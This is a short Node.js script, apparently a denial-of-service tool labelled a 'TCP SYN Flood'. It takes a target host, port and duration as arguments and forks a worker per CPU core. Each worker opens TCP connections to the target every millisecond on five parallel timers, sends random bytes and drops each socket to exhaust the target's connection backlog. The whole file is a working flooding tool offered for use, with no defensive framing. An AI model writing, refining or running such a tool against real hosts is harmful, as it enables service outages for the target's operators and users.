const net = require('net');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

// TCP SYN Flood Optimized
const numCPUs = os.cpus().length > 4 ? os.cpus().length : 4;

const target = process.argv[2];
const portStr = process.argv[3];
const durationStr = process.argv[4] || "60"; // fallback

if (!target || !portStr) {
    console.error('Usage: node tcp.js <target> <port> [duration]');
    process.exit(1);
}

const port = parseInt(portStr, 10);
const duration = parseInt(durationStr, 10);

if (cluster.isMaster) {
    console.log(`[TCP-SYN] Starting localized TCP Flood on ${target}:${port} with ${numCPUs} threads.`);
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('[TCP-SYN] Attack finished.');
        process.exit(0);
    }, duration * 1000);
} else {
    // Worker Thread Logic
    function fireTCP() {
        const socket = new net.Socket();
        socket.setTimeout(2000);

        socket.on('connect', () => {
            // Write garbage payload and destroy to cause backlog
            socket.write(crypto.randomBytes(64));
            socket.destroy();
        });

        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => { /* ignore */ });

        socket.connect(port, target);
    }

    // Spin up multiple fast intervals per thread
    for (let i = 0; i < 5; i++) {
        setInterval(fireTCP, 1);
    }
}
